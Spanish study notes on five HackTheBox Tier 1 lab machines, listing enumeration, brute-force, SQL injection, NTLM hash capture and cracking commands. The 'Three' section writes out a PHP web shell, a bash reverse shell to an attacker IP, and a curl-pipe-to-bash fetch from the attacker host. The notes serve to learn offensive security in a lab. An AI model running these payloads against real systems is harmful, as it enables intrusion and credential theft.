# Máquina Tier 1

## Máquina 1 (Appointment)
Servicios usados:
- Apache (Puerto 80)

**Comandos útiles maquina 2**

> `sudo hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <HOST> http-post-form  "/index.php:username=^USER^&password=^PASS^:<INVALID MSG>"`

> `admin'#`

**Detalles vulnerabilidad**
La máquina 1 era vulnerable a ataques de `SQL Injection`, por lo tanto se intento hacer uso de una cuenta de usuario común como `admin`, y a la vez evitar la validación de contraseña con el siguiente input: `admin'#`.


## Máquina 2 (Sequel)
Servicios usados:
- mysql 

**Comandos útiles maquina 2**
> `mysql -h <HOST> -u <USER> -p`

> `show databases;`

> `use <Database>;`

> `show tables;`

> `select * from <TABLE>;`

**Detalles vulnerabilidad**
El servicio de mysql estaba configurado con las credenciales por defecto, por lo tanto se pudo acceder con el usuario `root` y contraseña vacía. Dentro de la base de datos se pudo navegar libremente para la búsqueda de la bandera.


## Máquina 3 (Crocodile)
Servicios usados:
- Ftp
- Apache

**Comandos útiles máquina 3**

Aplica el uso de script por defecto

> `nmap -sCV <host>` 

Acceder al servicio ftp con cuenta anonymous

`ftp <HOST>`
`anonymous`

El parámetro `-x` permite buscar exclusivamente aquellos archivos que terminan con la extensión establecida

> `sudo gobuster dir -w <DIR_DE_WORDLIST> -u <HOST> -x php,html`


**Detalles vulnerabilidad**
La máquina contaba con dos servicios, uno ftp y el otro web. Primero se pudo acceder al servicio ftp con la credencial por defecto de `anonymous`. Con esto se pudo obtener credenciales de acceso de un usuario `admin` (usuario y contraseña).

Posteriormente el análisis en gobuster descubrió una ruta oculta de `login.php`. Con el usuario obtenido anteriormente y con la ruta oculta se logro acceder al dashboard de la plataforma.

## Máquina 4 (Responder)
Servicios usados:
- Apache httpd 2.4.52
- Microsoft HTTPAPI httpd 2.0

**Recursos útiles**
- Responder: https://github.com/lgandx/Responder
- Microsoft NTLM: https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm
- File inclusion window wordlist: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

**Comandos útiles máquina 4**

Guarda el escaneo en un archivo `last-nmap-scan`, evita que se haga un ping previo al escaneo y establece como mínimo el envió de paquete en 500, lo cual aumenta la velocidad de escaneo. 
> `sudo nmap -oN last-nmap-scan -Pn -p- --min-rate 5000 -sV -vvv 10.129.173.207` 

Verificar configuración del Responder
> `cat /etc/responder/Responder.conf`

Inicia el servicio en escucha del responder a través de la interfaz `tun0`
> `sudo responder -I tun0`

Crackear el hash
> `john -w=/usr/share/wordlists/rockyou.txt hash.txt`

Acceder remotamente
> `evil-winrm -i <HOST> -u <USER> -p <PASSWORD>`

**Detalles vulnerabilidad**
- Existe un servicio web el cual redirige a la pagina `unika.htb` por lo tanto es necesario cambiar el archivo `/etc/hosts` para poder resolver el nombre de dominio virtual.
- Manipulando la plataforma web se encuentra que es vulnerable a **File Inclusion** y que se encuentra usando windows como sistema operativo.
- Se usa Responder en modo escucha de peticiones SMB para obtener el HASH NTLM durante un proceso de autenticación entre equipos de windows
- Se Crackea el hash mediante fuerza bruta haciendo uso de *John the Ripper*
- A través de las credenciales obtenidas se accede mediante *evil-winrm* al equipo.

## Máquina 5 (Three)
Servicios usados:
- Apache httpd 2.4.29 en puerto 80
- OpenSSH 7.6 en puerto 22

**Comandos útiles máquina 4**

Enumerar rutas con wfuzz
> `sudo wfuzz -c -f sub-wfuzz --hc 404 -w /usr/share/wordlists/dirb/common.txt http://<DOMAIN>/FUZZ`

Enumerar subdominios
> `sudo gobuster vhost -w /usr/share/wordlists/subdomains.txt -u <DOMAIN>`

Haciendo uso de wfuzz
> `sudo wfuzz -c -f sub-wfuzz --sc 200,202,204,301,302,307,400,403,404 -Z -w /usr/share/wordlists/subdomains.txt http://FUZZ.<DOMAIN>`

Tambien se necesita agregar el subdominio en el archivo `hosts`
> `echo "10.129.227.248 <SUB>.<DOMAIN>.<TOP>" | sudo tee -a /etc/hosts`

Configurar awscli
> `aws configure`

Enumerar todos los Buscket de S3
> `aws --endpoint=http://s3.<DOMAIN> s3 ls `

Enumerar contenido del bucket en especifico 
> `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

Crear archivo `shell.php` para ejecutar comandos 
> `echo '<?php system($_GET["cmd"]); ?>' > shell.php`

Subir `shell.php` al bucket `s3`
> `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

Crear archivo `shell.sh` para ejecutar el `Reverse TCP Shell`
```
#!/bin/bash
bash -i >& /dev/tcp/<IP-ATACANTE>/4444 0>&1  
```
Hospedar archivo `shell.sh`
> `python -m http.server 8001`

Escuchar por conexiones
> `nc -nvlp 4444`

Navegador al siguiente url:
> `http://<DOMINIO/HOST>/<RUTA>/shell.php?cmd=curl <IP-ATACANTE>:8001/shell.sh|bash`

Enumerar objetos y prefijos comunes en el bucket especificado.
**Detalles vulnerabilidad**
- Existe un dominio de `thetoppers.htb`
- Enumerando los subdominios se encuentra `s3`, el cual pertenece a un bucket de Amazon S3
- Dado a las malas configuraciones se puede obtener y manipular datos del Bucket S3 con `awscli`
- Crear y Agregar archivo `shell.php` en el bucket
- Crear y hospedar el archivo `shell.sh` en la maquina atacante.
- Usar `netcat` para escuchar por conexiones externas.
- Mediante la ejecución de `shell.php` desde una url en el navegador, es posible obtener el archivo `shell.sh` y ejecutarlo de manera remota para crear una *reverse shell*.


